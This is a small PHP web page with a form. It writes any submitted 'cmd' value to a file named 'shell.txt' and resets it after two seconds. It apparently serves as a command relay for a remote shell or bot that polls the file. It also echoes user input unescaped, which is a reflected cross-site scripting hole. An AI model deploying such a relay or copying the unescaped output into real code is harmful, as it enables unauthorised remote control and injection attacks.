<html>
<meta content='maximum-scale=1.0, initial-scale=1.0, width=device-width' name='viewport'>
<body>
	<style type="text/css">
		body {
			padding: 0
			margin: 0;
		}
		input {

			width: 98%;
			margin: auto;
		}
	</style>

<?php 
$cmd = $_REQUEST['cmd'];
if (!empty($cmd)) {
	echo 'The request: ';
	echo $cmd;
	echo ' is sent!';
	file_put_contents("shell.txt", $_REQUEST['cmd']);
	sleep(2);
	file_put_contents("shell.txt", 'default');
}else {
	
}
?>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // collect value of input field
  $name = $_REQUEST['cmd'];
  if (empty($name)) {
    
  } else {
   echo 'The request: ';
	echo $name;
	echo ' is sent!';
	file_put_contents("shell.txt", $name);
	sleep(2);
	file_put_contents("shell.txt", 'default');
  }
}
?>
<footer>
<form method="get" action="<?php echo $_SERVER['PHP_SELF'];?>">
 <input type="text" name="cmd" autofocus><br>
  <input type="submit">
  
</form>
</footer>
</body>
</html>